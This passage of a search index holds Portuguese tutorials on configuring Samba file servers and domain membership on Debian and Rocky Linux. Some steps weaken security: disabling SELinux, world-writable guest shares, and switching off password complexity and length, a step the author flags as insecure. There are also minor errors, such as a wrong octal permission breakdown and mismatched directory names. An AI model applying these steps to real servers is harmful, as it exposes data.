 sudo vim /etc/samba/smb.conf\n</code></pre> <p>Insira o seguinte conte\u00fado:</p> <pre><code>[global]\n   workgroup = ESHARKNET\n   netbios name = Fileserver\n   server string = Servidor de Arquivos\n   security = user\n   map to guest = bad user\n   dns proxy = no\n\n[diretoria]\n   comment = Diret\u00f3rio diretoria\n   path = /srv/samba/arquivos/diretoria\n   browseable = yes\n   writable = yes\n   guest ok = no\n   valid users = @gdiretoria\n   write list = @gdiretoria\n   create mask = 0660\n   directory mask = 2770\n\n[financeiro]\n   comment = Diret\u00f3rio financeiro\n   path = /srv/samba/arquivos/financeiro\n   browseable = no\n   writable = yes\n   guest ok = no\n   valid users = @gfinanceiro\n   write list = @gfinanceiro\n   create mask = 0660\n   directory mask = 2770\n\n[publica]\n   comment = Pasta Publica\n   path = /srv/samba/arquivos/publica\n   browseable = yes\n   writable = yes\n   guest ok = yes\n   create mask = 0664\n   directory mask = 2775\n</code></pre>"},{"location":"Fileserver_Debian/#8-ativar-e-reiniciar-os-servicos-do-samba","title":"8 - Ativar e reiniciar os servi\u00e7os do Samba","text":"<pre><code>    sudo systemctl enable smbd\n    sudo systemctl restart smbd\n</code></pre>"},{"location":"Fileserver_Debian/#9-testar-configuracao-verificando-se-nao-ha-erros","title":"9 - Testar configura\u00e7\u00e3o, verificando se n\u00e3o h\u00e1 erros:","text":"<pre><code>    testparm\n</code></pre>"},{"location":"Fileserver_Debian/#10-acessar-os-compartilhamentos","title":"10 - Acessar os compartilhamentos","text":"<p>Agora, de outra m\u00e1quina na mesma rede, voc\u00ea pode acessar:</p> <ul> <li> <p>No Explorer do Windows: <pre><code>    \\\\IP_DO_SERVIDOR\\diretoria\n    \\\\IP_DO_SERVIDOR\\financeiro\n    \\\\IP_DO_SERVIDOR\\Publico\n</code></pre></p> </li> <li> <p>Na barra do gerenciador de arquivos do Linux:  <pre><code>    smb://IP_DO_SERVIDOR\n</code></pre></p> </li> </ul> <p>Lembre-se de ajustar as configura\u00e7\u00f5es de firewall se necess\u00e1rio para permitir o tr\u00e1fego SMB na sua rede.</p>"},{"location":"Fileserver_Debian/#sessao-de-anotacoes","title":"SESS\u00c3O DE ANOTA\u00c7\u00d5ES:","text":""},{"location":"Fileserver_Debian/#diferenca-entre-valid-users-e-write-list-quem-acessa-x-quem-modifica","title":"Diferen\u00e7a entre VALID USERS e WRITE LIST (quem acessa x quem modifica)","text":"<pre><code>     valid users\n</code></pre> <ul> <li> <p>Define quem pode acessar o compartilhamento.</p> </li> <li> <p>Se algu\u00e9m que n\u00e3o est\u00e1 nessa lista tentar montar o compartilhamento, vai levar acesso negado.</p> </li> </ul> <p>Voc\u00ea pode usar:</p> <ul> <li> <p>Usu\u00e1rios individuais: valid users = kalel diana</p> </li> <li> <p>Grupos: valid users = @projetox</p> </li> </ul> <pre><code>     write list\n</code></pre> <ul> <li> <p>Define quem pode escrever (alterar, criar, excluir arquivos).</p> </li> <li> <p>Se n\u00e3o estiver no write list, o usu\u00e1rio s\u00f3 ter\u00e1 permiss\u00e3o de leitura, mesmo que consiga acessar.</p> </li> </ul> <p>Exemplo:</p> <ul> <li> <p>write list = @projetox \u2192 s\u00f3 membros do grupo podem escrever.</p> </li> <li> <p>valid users = @todos \u2192 todos acessam, mas s\u00f3 o grupo projetox pode gravar.</p> </li> </ul>"},{"location":"Fileserver_Debian/#as-flags-de-setuid-setgid-e-sticky-bit","title":"As flags de SETUID, SETGID e STICKY BIT:","text":"<p>Esses par\u00e2metros, no Samba, controlam as permiss\u00f5es de arquivos e pastas DE REDE, rec\u00e9m-criados dentro do compartilhamento, independentemente das permiss\u00f5es LOCAIS do Linux j\u00e1 existentes.</p> <p>Significado dos valores</p> <p>DIRET\u00d3RIOS:</p> <pre><code>* directory mask = 0775\n</code></pre> <p>Afeta DIRET\u00d3RIOS novos.</p> <p>0775 em octal:</p> <p>0 \u2192 bits especiais (setuid/setgid/sticky) desligados</p> <p>7 \u2192 dono: leitura (r), escrita (w), execu\u00e7\u00e3o (x)</p> <p>7 \u2192 grupo: leitura (r), escrita (w), execu\u00e7\u00e3o (x)</p> <p>5 \u2192 outros: leitura (r), escrita (x), execu\u00e7\u00e3o (-)</p> <p>ARQUIVOS:</p> <pre><code>* create mask = 0664\n</code></pre> <p>Afeta ARQUIVOS novos (arquivos nunca precisam de \"execu\u00e7\u00e3o\").</p> <p>0664 em octal:</p> <p>0 \u2192 bits especiais (setuid/setgid/sticky) desligados</p> <p>6 \u2192 dono: leitura (r), escrita (w), execu\u00e7\u00e3o (-)</p> <p>6 \u2192 grupo: leitura (r), escrita (w), execu\u00e7\u00e3o (-)</p> <p>4 \u2192 outros: leitura (r), escrita, (-) execu\u00e7\u00e3o (-)</p> <p>THAT'S ALL FOLKS</p>"},{"location":"Fileserver_Rocky/","title":"\ud83d\udcc1 FileServer Rocky","text":""},{"location":"Fileserver_Rocky/#servidor-de-arquivos-do-ad-no-rocky-linux-9","title":"Servidor de Arquivos do AD no Rocky Linux 9","text":""},{"location":"Fileserver_Rocky/#apos-a-instalacao-do-sistema-operacional-seguir-com-os-comandos-para-a-instalacao-e-configuracao-do-samba-como-membro-e-servidor-de-arquivos","title":"Ap\u00f3s a instala\u00e7\u00e3o do sistema operacional, seguir com os comandos para a instala\u00e7\u00e3o e configura\u00e7\u00e3o do samba como membro e servidor de arquivos.","text":""},{"location":"Fileserver_Rocky/#atualizar-o-sistema","title":"Atualizar o sistema:","text":"<p><pre><code>yum update -y &amp;&amp; yum upgrade -y\n</code></pre> Instalar os pacotes do samba necess\u00e1rios para samba e servidor de arquivos: <pre><code>yum install samba samba-winbind samba-winbind-clients\n</code></pre> Habilitar os servi\u00e7os para iniciar junto ao boot do sistema: <pre><code>systemctl enable smb nmb winbind\n</code></pre>  Configurar e editar o arquivo /etc/hosts: <pre><code>nano /etc/hosts\n</code></pre> <pre><code>127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n10.1.1.13   arquivos.esharknet.edu arquivos\n::1 localhost localhost.localdomain localhost6 localhost6.localdomain6\n</code></pre> Salvar o arquivo</p>"},{"location":"Fileserver_Rocky/#configurar-e-editar-etchostname","title":"Configurar e editar /etc/hostname:","text":"<p><pre><code>nano /etc/hostname\n</code></pre> <pre><code>arquivos.esharknet.edu\n</code></pre> Salvar o Arquivo</p>"},{"location":"Fileserver_Rocky/#configurar-e-editar-etcnsswitchconf","title":"Configurar e editar /etc/nsswitch.conf:","text":"<pre><code>nano /etc/nsswitch.conf\n</code></pre> <p>Mudar a configura\u00e7\u00e3o</p> <p>De: <pre><code>passwd: sss files systemd\n</code></pre></p>"},{"location":"Fileserver_Rocky/#para","title":"Para:","text":"<pre><code>passwd: files winbind\n</code></pre> <p>De: <pre><code>group: sss files systemd\n</code></pre></p>"},{"location":"Fileserver_Rocky/#para_1","title":"Para:","text":"<p><pre><code>group: files winbind\n</code></pre> Salve o arquivo </p>"},{"location":"Fileserver_Rocky/#configurar-a-rede-e-inserir-dados-do-dns-do-ad-dc-ou-seja-do-seu-controlador-de-dominio","title":"Configurar a rede e inserir dados do DNS do AD-DC ou seja, do seu controlador de dom\u00ednio:","text":"<pre><code>nmtui\n</code></pre> <p>Escolha Editar uma Conex\u00e3o</p> <p>Digite Enter</p> <p>Com a tela Tab v\u00e1 em Editar</p> <p>Com as teclas de dire\u00e7\u00e3o (setas) mova-se at\u00e9 Servidores DNS e troque o IP para o IP de seu AD DC (controlador de dom\u00ednio)</p> <p>Ainda com as setas de dire\u00e7\u00e3o, v\u00e1 at\u00e9 Dom\u00ednios de pesquisa e digite enter para adicionar o seu.dom\u00ednio. Ent\u00e3o, selecione OK com as setas de dire\u00e7\u00e3o e digite enter. </p> <p>Com a tecla Tab, v\u00e1 at\u00e9 a op\u00e7\u00e3o: voltar e digite enter. Ent\u00e3o, com a tecla Tab, selecione a op\u00e7\u00e3o OK e digite enter</p>"},{"location":"Fileserver_Rocky/#reiniciar-o-sistema","title":"Reiniciar o sistema:","text":"<pre><code>reboot\n</code></pre>"},{"location":"Fileserver_Rocky/#editar-o-arquivo-usermap-no-diretorio-etcsamba-com-o-conteudo","title":"Editar o arquivo user.map no diret\u00f3rio /etc/samba com o conte\u00fado:","text":"<p><pre><code>nano /etc/samba/user.map\n</code></pre> <pre><code>!root = DOMINIO\\Administrator\n</code></pre> Salve o arquivo</p>"},{"location":"Fileserver_Rocky/#fazer-um-backup-do-arquivo-etcsambasmbconf","title":"Fazer um backup do arquivo /etc/samba/smb.conf:","text":"<p><pre><code>mv /etc/samba/smb.conf /etc/samba/smb.conf.bkp\n</code></pre> Fazer um arquivo smb.conf para funcionar como membro e servidor de arquivo de modelo (rid) <pre><code>nano /etc/samba/smb.conf\n</code></pre></p> <pre><code>[global]\n    bind interfaces only = Yes\n    dedicated keytab file = /etc/krb5.keytab\n    kerberos method = secrets and keytab\n    log file = /var/log/samba/%m.log\n    min domain uid = 0\n    realm = ESHARKNET.EDU\n    security = ADS\n    template homedir = /home/%U\n    template shell = /bin/bash\n    winbind refresh tickets = Yes\n    winbind use default domain = Yes\n    workgroup = ESHARKNET\n    idmap config dominio : range = 10000-999999\n    idmap config dominio : backend = rid\n    idmap config * : range = 3000-7999\n    idmap config * : backend = tdb\n    map acl inherit = Yes\n    vfs objects = acl_xattr\n</code></pre>"},{"location":"Fileserver_Rocky/#fazer-uma-copia-do-arquivo-etckrb5conf","title":"Fazer uma c\u00f3pia do arquivo /etc/krb5.conf","text":"<pre><code>mv /etc/krb5.conf /etc/krb5.conf.bkp\n</code></pre> <p>Editar um novo arquivo krb5.conf</p> <pre><code>nano /etc/krb5.conf\n</code></pre> <pre><code>[libdefaults]\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n    default_realm = ESHARKNET.EDU\n</code></pre> <p>Salvar o arquivo</p>"},{"location":"Fileserver_Rocky/#verificar-se-existe-algum-erro-de-sintaxe-com-o-comando","title":"Verificar se existe algum erro de sintaxe com o comando:","text":"<pre><code>testparm\n</code></pre>"},{"location":"Fileserver_Rocky/#se-nao-houver-erros-executar-o-comando-para-recarregar-o-samba-novamente","title":"Se n\u00e3o houver erros, executar o comando para recarregar o samba novamente","text":"<pre><code>smbcontrol all reload-config\n</code></pre>"},{"location":"Fileserver_Rocky/#desabilitar-o-selinux","title":"Desabilitar o SELinux:","text":"<p><pre><code>nano /etc/selinux/config\n</code></pre> Na linha SELINUX=enforcing trocar para SELINUX=disabled</p> <p>Salvar o arquivo</p>"},{"location":"Fileserver_Rocky/#ajustar-o-firewall-adicionar-o-servico-do-samba-e-recarregar-o-firewall","title":"Ajustar o Firewall. Adicionar o servi\u00e7o do samba e recarregar o Firewall:","text":"<pre><code>firewall-cmd --add-service=samba --permanent\nfirewall-cmd --reload\n</code></pre>"},{"location":"Fileserver_Rocky/#reiniciar-o-servidor","title":"Reiniciar o servidor:","text":"<pre><code>reboot\n</code></pre>"},{"location":"Fileserver_Rocky/#comando-para-juntar-se-ao-dominio-criado","title":"Comando para juntar-se ao Dom\u00ednio Criado:","text":"<p><pre><code>net ads join -U administrator  \nEnter administrator's password: senha do provisionamento\n</code></pre> <pre><code>Using short domain name -- ESHARKNET\nJoined 'ARQUIVOS' to dns domain 'esharknet.edu'\n</code></pre></p>"},{"location":"Fileserver_Rocky/#verificar-conexao-netlogon-com-o-ad","title":"Verificar conex\u00e3o NETLOGON com o AD:","text":"<pre><code>wbinfo --ping-dc\n</code></pre> <p>Como resultado deve aparecer:</p> <pre><code>checking the NETLOGON for domain[ESHARKNET] dc connection to \"dcmaster.esharknet.edu\" succeeded\n</code></pre>"},{"location":"Fileserver_Rocky/#verificar-se-o-servidor-dc1-seu-controlador-de-dominio-volta-resposta-com-o-comando-nslookup-seudominio","title":"Verificar se o Servidor DC1 (seu controlador de dominio) volta resposta com o comando: nslookup SEU.DOMINIO:","text":"<p><pre><code>nslookup dcmaster.esharknet.edu\n</code></pre> Um resultado parecido com esse deve aparecer na tela:</p> <pre><code>Server:     192.168.70.250\nAddress:    192.168.70.250#53\n\nName:   dcmaster.esharknet.edu\nAddress: 192.168.70.250\n</code></pre>"},{"location":"Fileserver_Rocky/#e-tambem-atraves-ip-do-seu-servidor-dcmaster","title":"E tamb\u00e9m atrav\u00e9s IP do seu Servidor DCMaster:","text":"<pre><code>nslookup 192.168.70.250\n</code></pre> <pre><code>Authoritative answers can be found from:\n168.192.IN-ADDR.ARPA\n    origin = 168.192.IN-ADDR.ARPA\n    mail addr = .\n    serial = 0\n    refresh = 28800\n    retry = 7200\n    expire = 604800\n    minimum = 86400\n</code></pre> <p>Antes de prosseguir, conectar seu DCMaster e criar um grupo e um usu\u00e1rio. NO DCMASTER fa\u00e7a o comando pra criar o grupo: <pre><code>samba-tool group add 'Linux Domain'\n</code></pre> E tamb\u00e9m adicione um usu\u00e1rio: <pre><code>samba-tool user add 'esharkuser'\n</code></pre></p>"},{"location":"Fileserver_Rocky/#verificar-se-retorna-o-gid-do-grupo","title":"Verificar se retorna o GID do Grupo:","text":"<pre><code>getent group \"ESHARKNET\\\\Linux Domain\"\nlinux domain:x:3013:\n</code></pre>"},{"location":"Fileserver_Rocky/#garantir-privilegio-de-acesso-com-o-comando","title":"Garantir privil\u00e9gio de acesso com o Comando:","text":"<pre><code>net rpc rights grant \"ESHARKNET\\Domain Admins\" SeDiskOperatorPrivilege -U \"ESHARKNET\\Administrator\"\nEnter ESHARK\\Administrator password: senha CRIADA no provisionamento do DCMaster\n# Caso tenha criado corretamente o sistema ir\u00e1 dar sucesso do comando\n\nSuccessfully granted rights.\n</code></pre>"},{"location":"Fileserver_Rocky/#chegando-nesse-ponto-esta-apto-a-iniciar-a-configuracao-da-montagem-de-disco-o-diretorio-escolhido-para-abrigar-seus-arquivos-bem-como-ajustar-as-permissoes-de-acesso-para-que-seja-possivel-fazer-as-alteracoes-via-rsat-com-as-devidas-permissoes","title":"Chegando nesse ponto, est\u00e1 apto a iniciar a configura\u00e7\u00e3o da montagem de disco, o diret\u00f3rio escolhido para abrigar seus arquivos bem como, ajustar as permiss\u00f5es de acesso para que seja poss\u00edvel fazer as altera\u00e7\u00f5es via RSAT com as devidas permiss\u00f5es.","text":"<p>Exemplo:</p>"},{"location":"Fileserver_Rocky/#se-criou-um-disco-e-disponibilizou-o-diretorio-srvarquivos-e-entao-indicou-esse-caminho-em-seu-smbconf-ou-seja-apos-a-sessao-global-indicando-o-nome-de-seu-compartilhamento-do-servidor-de-arquivos-caminho-e-ajustar-as-permissoes-de-acesso-seguindo-o-exemplo","title":"Se criou um disco e disponibilizou o diret\u00f3rio /srv/arquivos e ent\u00e3o, indicou esse caminho em seu smb.conf ou seja, ap\u00f3s a sess\u00e3o global indicando o nome de seu compartilhamento do servidor de arquivos, caminho, e ajustar as permiss\u00f5es de acesso seguindo o exemplo:","text":"<p><pre><code>vim /etc/samba/smb.conf\n</code></pre> <pre><code>[ARQUIVOS]\n   path = /srv/arquivos/\n   read only = no\n   browseable = yes\n</code></pre></p>"},{"location":"Fileserver_Rocky/#salve-o-arquivo","title":"Salve o arquivo","text":""},{"location":"Fileserver_Rocky/#ajustando-as-permissoes-para-o-grupo-no-diretorio-criado","title":"Ajustando as permiss\u00f5es para o Grupo no diret\u00f3rio criado:","text":"<pre><code>chown root:\"Domain Admins\" /srv/arquivos\nchmod 775 -R /srv/arquivos\n</code></pre>"},{"location":"Fileserver_Rocky/#recarregar-novamente-o-smbcontrol","title":"Recarregar novamente o smbcontrol","text":"<pre><code>smbcontrol all reload-config\n</code></pre>"},{"location":"Fileserver_Rocky/#atraves-do-windows-logue-se-com-a-conta-administrator-e-atraves-do-rsat-inicie-suas-configuracoes-desejadas","title":"Atrav\u00e9s do Windows, logue-se com a conta Administrator e atrav\u00e9s do RSAT inicie suas configura\u00e7\u00f5es desejadas.","text":"<p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Fileserver_RockyLinux/","title":"\ud83d\udcc1 FileServer RockyLinux","text":""},{"location":"Fileserver_RockyLinux/#instalacao-do-samba4","title":"INSTALA\u00c7\u00c3O DO SAMBA4","text":"<pre><code>dnf install samba samba-client\n</code></pre>"},{"location":"Fileserver_RockyLinux/#habilitando-o-servico","title":"HABILITANDO O SERVI\u00c7O","text":"<pre><code>systemctl start smb.service \nsystemctl start nmb.service \nsystemctl enable smb.service \nsystemctl enable nmb.service\n</code></pre> <pre><code>smbd --version\n</code></pre>"},{"location":"Fileserver_RockyLinux/#editando-o-smbconf","title":"EDITANDO O smb.conf","text":"<pre><code>mv /etc/samba/smb.conf{,.orig}\n\nvim /etc/samba/smb.conf\n</code></pre> <pre><code>[global]\n    workgroup = ESHARKNET\n    #hosts allow = 127. 192.168.0\n    server string = Servidor de Arquivos %v\n    netbios name = servidor\n    security = user\n    map to guest = bad user\n    dns proxy = no\n    ntlm auth = true\n\n    passdb backend = tdbsam\n\n    printing = cups\n    printcap name = cups\n    load printers = yes\n    cups options = raw\n\n[home]\n    comment = Diretorio Home\n    valid users = %S, %D%w%S\n    browseable = No\n    read only = No\n    inherit acls = Yes\n\n[printers]\n    comment = All Printers\n    path = /var/tmp\n    printable = Yes\n    create mask = 0600\n    browseable = No\n\n[print$]\n    comment = Printer Drivers\n    path = /var/lib/samba/drivers\n    write list = @printadmin root\n    force group = @printadmin\n    create mask = 0664\n    directory mask = 0775\n\n[ARQUIVOS]\n    comment = Compartilhamentos de Rede\n    path = /srv/samba/ARQUIVOS\n    browseable = Yes\n    writeable = Yes\n    guest ok = Yes\n\n[Diretoria]\n    path = /srv/samba/Diretoria\n    valid users = @diretoria\n    guest ok = no\n    writable = no\n    browsable = yes\n\n[Financeiro]\n    path = /srv/samba/Financeiro\n    valid users = @financeiro\n    guest ok = no\n    writable = no\n    browsable = yes\n\n[Rh]\n    path = /srv/samba/Rh\n    valid users = @rh\n    guest ok = no\n    writable = no\n    browsable = yes\n\n[Comercial]\n    path = /srv/samba/Comercial\n    valid users = @comercial\n    guest ok = no\n    writable = no\n    browsable = yes\n\n[Tecnicos]\n    path = /srv/samba/Tecnicos\n    valid users = @tecnicos\n    guest ok = no\n    writable = no\n    browsable = yes\n</code></pre>"},{"location":"Fileserver_RockyLinux/#validando-as-configuracoes","title":"VALIDANDO AS CONFIGURA\u00c7\u00d5ES","text":"<pre><code>testparm\n</code></pre>"},{"location":"Fileserver_RockyLinux/#criando-grupos-de-acesso","title":"CRIANDO GRUPOS DE ACESSO","text":"<pre><code>groupadd diretoria\ngroupadd financeiro\ngroupadd rh\ngroupadd comercial\ngroupadd tecnicos\n</code></pre>"},{"location":"Fileserver_RockyLinux/#criando-usuario-de-acesso-e-inserindo-nos-grupos","title":"CRIANDO USU\u00c1RIO DE ACESSO E INSERINDO NOS GRUPOS","text":"<pre><code>useradd Eduardo\nsmbpasswd -a Eduardo\nusermod -g diretoria Eduardo\n</code></pre> <pre><code>useradd Keila\nsmbpasswd -a Keila\nusermod -g financeiro Keila\n</code></pre> <pre><code>useradd Marcelo\nsmbpasswd -a Marcelo\nusermod -g rh Marcelo\n</code></pre> <pre><code>useradd Kaua\nsmbpasswd -a kaua\nusermod -g comercial kaua\n</code></pre> <pre><code>useradd Marcia\nsmbpasswd -a Marcia\nusermod -g tecnicos Marcia\n</code></pre>"},{"location":"Fileserver_RockyLinux/#validando-usuarios","title":"VALIDANDO USU\u00c1RIOS","text":"<pre><code>pdbedit -L\npdbedit -v -L\n</code></pre>"},{"location":"Fileserver_RockyLinux/#criando-diretorio-especifico-com-politicas-de-acesso","title":"CRIANDO DIRET\u00d3RIO ESPEC\u00cdFICO COM POL\u00cdTICAS DE ACESSO","text":"<pre><code>mkdir -p /srv/samba/Diretoria\nchmod -R 770 /srv/samba/Diretoria\nchown -R root:diretoria /srv/samba/Diretoria\n</code></pre> <pre><code>mkdir -p /srv/samba/financeiro\nchmod -R 770 /srv/samba/financeiro\nchown -R root:financeiro /srv/samba/Financeiro\n</code></pre> <pre><code>mkdir -p /srv/samba/Rh\nchmod -R 770 /srv/samba/Rh\nchown -R root:rh /srv/samba/Rh\n</code></pre> <pre><code>mkdir -p /srv/samba/Tecnicos\nchmod -R 770 /srv/samba/Tecnicos\nchown -R root:tecnicos /srv/samba/Tecnicos\n</code></pre> <pre><code>mkdir -p /srv/samba/Comercial\nchmod -R 770 /srv/samba/Comercial\nchown -R root:comercial /srv/samba/Comercial\n</code></pre>"},{"location":"Fileserver_RockyLinux/#restartando-os-servicos","title":"Restartando os servi\u00e7os","text":"<pre><code>systemctl restart smbd\nsystemctl restart nmbd\n</code></pre>"},{"location":"Fileserver_RockyLinux/#acesse-o-diretorio-geral-e-logue-com-seu-usuario-e-senha","title":"Acesse o diret\u00f3rio Geral e logue com seu usu\u00e1rio e senha","text":"<p>No Explorer do Windows ou do Linux:</p> <p>smb://192.168.0.250/</p> <p>No Terminal do Linux:</p> <pre><code>smbclient \u00b4\\\\192.168.0.250\u00b4 -U eduardo\n</code></pre> <pre><code>smbclient //192.168.0.250 -U Eduardo\n</code></pre> <pre><code>smbstatus\n</code></pre>"},{"location":"Fileserver_RockyLinux/#pesquisar","title":"Pesquisar:","text":"<pre><code>setfacl -R -m \"g:financeiro:rwx\" /srv/samba/Financeiro\n</code></pre>"},{"location":"Fileserver_sem_RSAT/","title":"SAMBA4 - Fileserver sem gerenciamento por RSAT","text":""},{"location":"Fileserver_sem_RSAT/#tutorial-configuracao-de-compartilhamento-smb-no-linux","title":"Tutorial: Configura\u00e7\u00e3o de Compartilhamento SMB no Linux","text":"<p>Este tutorial ir\u00e1 gui\u00e1-lo atrav\u00e9s do processo de configura\u00e7\u00e3o de um servidor Samba em um ambiente Linux.</p> <p>## Instala\u00e7\u00e3o do Samba</p> <p>Primeiro, atualize a lista de pacotes e instale o Samba:</p> <pre><code>sudo apt update\n</code></pre> <pre><code>sudo apt install samba -y\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#criando-usuarios-e-diretorios","title":"Criando Usu\u00e1rios e Diret\u00f3rios","text":"<pre><code>sudo adduser suporte\n</code></pre> <p>Criar diret\u00f3rios para compartilhamento</p> <pre><code>sudo mkdir -p /home/samba/estoque\n</code></pre> <pre><code>sudo mkdir -p /home/samba/gestao\n</code></pre> <pre><code>sudo mkdir -p /home/samba/publico\n</code></pre> <p>Ajustar permiss\u00f5es dos diret\u00f3rios</p> <pre><code>sudo chmod -R 770 /home/samba/estoque\n</code></pre> <pre><code>sudo chmod -R 770 /home/samba/gestao\n</code></pre> <pre><code>sudo chmod -R 777 /home/samba/publico\n</code></pre> <pre><code>sudo chown -R root:users /home/samba/estoque\n</code></pre> <pre><code>sudo chown -R root:users /home/samba/gestao\n</code></pre> <pre><code>sudo chown -R nobody:nogroup /home/samba/publico\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#configurando-o-samba","title":"Configurando o Samba","text":"<p>Fazer backup do arquivo de configura\u00e7\u00e3o original</p> <pre><code>sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak\n</code></pre> <p>Editar o arquivo de configura\u00e7\u00e3o</p> <pre><code>sudo nano /etc/samba/smb.conf\n</code></pre> <p>Adicione as seguintes configura\u00e7\u00f5es ao final do arquivo:</p> <pre><code>[global]\n   workgroup = WORKGROUP\n   server string = Servidor Samba\n   security = user\n   map to guest = bad user\n   dns proxy = no\n\n[Estoque]\n   comment = Diret\u00f3rio de Estoque\n   path = /home/samba/estoque\n   browsable = yes\n   writable = yes\n   valid users = @users\n   create mask = 0770\n   directory mask = 0770\n\n[Gestao]\n   comment = Diret\u00f3rio de Gest\u00e3o\n   path = /home/samba/gestao\n   browsable = yes\n   writable = yes\n   valid users = @users\n   create mask = 0770\n   directory mask = 0770\n\n[Publico]\n   comment = Diret\u00f3rio P\u00fablico\n   path = /home/samba/publico\n   browsable = yes\n   writable = yes\n   guest ok = yes\n   create mask = 0777\n   directory mask = 0777\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#adicionando-usuarios-ao-samba","title":"Adicionando Usu\u00e1rios ao Samba","text":"<p>Adicione o usu\u00e1rio criado anteriormente ao Samba:</p> <pre><code>sudo smbpasswd -a suporte\n</code></pre> <p>Voc\u00ea ser\u00e1 solicitado a definir uma senha para o acesso Samba.</p>"},{"location":"Fileserver_sem_RSAT/#reiniciando-e-testando-o-servico","title":"Reiniciando e Testando o Servi\u00e7o","text":"<pre><code>sudo systemctl restart smbd\n</code></pre> <pre><code>sudo systemctl restart nmbd\n</code></pre> <pre><code>sudo systemctl status smbd\n</code></pre> <p>Testar a configura\u00e7\u00e3o</p> <pre><code>testparm\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#revisando-usuarios-e-grupos","title":"Revisando usu\u00e1rios e grupos:","text":"<pre><code>cat /etc/passwd # ( usu\u00e1rios locais do Linux gerencia do LDAP )\n</code></pre> <pre><code>samba-tool user list # ( usu\u00e1rios de rede gerenciados pelo SAMBA4 )\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#outras-validacoes-no-dominio","title":"Outras valida\u00e7\u00f5es no dom\u00ednio:","text":"<pre><code>wbinfo -u\nwbinfo -g\nwbinfo --ping-dc\ngetent group \u201cDomain Admins\u201d\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#verificando-servico-ativo","title":"Verificando servi\u00e7o ativo:","text":"<pre><code>ps aux | grep samba\nps ax | egrep \"samba|smbd|nmbd|winbindd\"\nps axf\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#consultando-o-servidor","title":"Consultando o Servidor:","text":"<pre><code>testparm\nsmbclient --version\nsmbclient -L localhost -U%\nsamba-tool domain level show\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#desabilitando-a-complexidade-de-senhas-inseguro","title":"Desabilitando a complexidade de senhas (INSEGURO!):","text":"<pre><code>samba-tool domain passwordsettings show\nsamba-tool domain passwordsettings set --complexity=off\nsamba-tool domain passwordsettings set --history-length=0\nsamba-tool domain passwordsettings set --min-pwd-length=0\nsamba-tool domain passwordsettings set --min-pwd-age=0\nsamba-tool user setexpiry Administrator --noexpiry\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#relendo-as-configuracoes-do-samba4","title":"Relendo as configura\u00e7\u00f5es do Samba4:","text":"<pre><code>smbcontrol all reload-config\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#validando-a-troca-de-tickets-do-kerberos","title":"Validando a troca de tickets do Kerberos:","text":"<pre><code>kinit Administrator@ESHARKNET.EDU\nklist\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#consultando-servicos-do-kerberos-e-do-ldap","title":"Consultando servi\u00e7os do <code>kerberos</code> e do <code>ldap</code>:","text":"<pre><code>host -t srv _kerberos._tcp.ESHARKNET.edu\nhost -t srv _ldap._tcp.ESHARKNET.edu\ndig ESHARKNET.edu\nhost -t A firewall\n</code></pre>"},{"location":"Fileserver_sem_RSAT/#agora-e-so-instalar-as-ferramentas-do-rsat-em-uma-maquina-windows-e-gerenciar-o-servidor","title":"Agora \u00e9 s\u00f3 instalar as ferramentas do <code>rsat</code> em uma m\u00e1quina Windows e gerenciar o Servidor!","text":"<p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Fileserver_sem_RSAT/#acessando-os-compartilhamentos","title":"Acessando os Compartilhamentos","text":"<p>Agora voc\u00ea pode acessar os compartilhamentos de outros computadores na rede:</p> <ul> <li>No Windows: Abra o Explorer e digite \\IP_DO_SERVIDOR na barra de endere\u00e7os</li> <li>No Linux: Abra o gerenciador de arquivos e digite smb://IP_DO_SERVIDOR na barra de endere\u00e7os</li> </ul> <p>(Substitua IP_DO_SERVIDOR pelo endere\u00e7o IP do seu servidor Linux.)</p> <p>Conclus\u00e3o</p> <p>Voc\u00ea configurou com sucesso um servidor Samba com tr\u00eas compartilhamentos diferentes:</p> <ul> <li>Estoque: Acess\u00edvel apenas para usu\u00e1rios autenticados</li> <li>Gestao: Acess\u00edvel apenas para usu\u00e1rios autenticados</li> <li>Publico: Acess\u00edvel para qualquer usu\u00e1rio, incluindo convidados</li> </ul> <p>Lembre-se de ajustar as configura\u00e7\u00f5es de firewall se necess\u00e1rio para permitir o tr\u00e1fego SMB na sua rede.</p> <p>Thats All Folk's</p>"},{"location":"Firewall_Server/","title":"\ud83d\udcc1 Firewall Server","text":""},{"location":"Firewall_Server/#criando-um-servidor-de-firewall","title":"Criando um Servidor de Firewall","text":""},{"location":"Firewall_Server/#esta-maquina-esta-equipada-com-2-placas-de-rede-enp1s0-e-enp7s0","title":"Esta m\u00e1quina est\u00e1 equipada com 2 placas de rede (enp1s0 e enp7s0):","text":""},{"location":"Firewall_Server/#editando-as-placas-de-redes-e-setando-ip-fixo","title":"Editando as placas de redes e setando ip fixo:","text":"<pre><code>vim /etc/network/interfaces\n</code></pre> <pre><code># The primary network interface\nallow-hotplug enp1s0\niface enp1s0 inet static\naddress 192.168.122.254\nnetwork 192.168.122.0\nnetmask 255.255.255.0\ngateway 192.168.122.1\ndns-nameserver 192.168.122.1\n\n# The secundary network interface\nallow-hotplug enp7s0\niface enp7s0 inet static\naddress 192.168.70.254\nnetwork 192.168.70.0\nnetmask 255.255.255.0\n</code></pre>"},{"location":"Firewall_Server/#editando-o-resolvedor-de-nomes","title":"Editando o resolvedor de nomes:","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>domain esharknet.edu\nsearch esharknet.edu.\nnameserver 192.168.122.1 #(Roteador)\n</code></pre>"},{"location":"Firewall_Server/#habilitando-o-roteamento-atraves-do-kernel","title":"Habilitando o roteamento atrav\u00e9s do Kernel:","text":"<pre><code>vim /etc/sysctl.d/sysctl.conf\n</code></pre> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <pre><code>sysctl -p /etc/sysctl.d/sysctl.conf\n</code></pre> 